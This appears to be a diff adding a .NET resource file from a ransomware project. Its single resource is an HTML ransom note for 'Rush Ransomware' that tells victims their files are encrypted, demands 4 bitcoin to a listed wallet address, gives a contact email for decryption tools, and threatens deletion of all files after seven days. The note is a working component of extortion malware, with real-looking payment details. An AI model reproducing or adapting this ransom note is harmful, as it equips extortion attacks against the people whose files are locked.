@@ -1,0 +1,63 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="1"><value>&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+body{
+	background-color: #3366CC;
+	}
+   h1 {
+    background-color: RGB(249, 201, 16);
+   }
+   p {
+    background-color: maroon; 
+    color: white;
+   }	
+&lt;/style&gt;
+ &lt;/head&gt;	
+	&lt;body&gt;
+	&lt;center&gt;
+	&lt;h1&gt;&lt;b&gt; All your files &lt;/b&gt; have been encrypted with Rush Ransomware&lt;/h1&gt;&lt;/br&gt;
+	&lt;p&gt;Your unique GUID for decrypt:&lt;b&gt; $userNameG&lt;/b&gt;&lt;/br&gt;
+	Send me some 4 bitcoin on adress: &lt;b&gt;1LzgiXV3Qip39cruiytSqkxEeLXF4iTksJ&lt;/b&gt;&lt;/br&gt;
+	After confirming the payment, all your files can be decrypted.&lt;/br&gt;
+	If you do not make payment within 7 days, you will lose the ability to decrypt them AND ALL YOUR FILES HAVE BEEN DELETED.&lt;/br&gt;
+	Make your Bitcoin Wallet on: https://www.coinbase.com/ or http://blockchain.info &lt;/br&gt;
+	How to buy /sell and send Bitcoin : &lt;/br&gt;
+	1)https://support.coinbase.com/customer/en/portal/topics/796531-payment-method-verification/articles &lt;/br&gt;
+	2)https://support.coinbase.com/customer/en/portal/topics/601090-buying-selling-bitcoin/articles &lt;/br&gt;
+	3)https://support.coinbase.com/customer/en/portal/topics/601112-sending-receiving-bitcoin/articles &lt;/br&gt;&lt;/br&gt;
+
+	After the payment, send the wallet from which paid and your uniq ID to mail : &lt;b&gt; unransom@mail.com &lt;/b&gt;&lt;/br&gt;
+	After receiving the payment, we will contact and give you decryption tools and faq how to decrypt your files.&lt;/br&gt;
+	&lt;/p&gt;
+	&lt;/center&gt;&lt;/html&gt;&lt;/body&gt;
+</value></data>
+  </root>
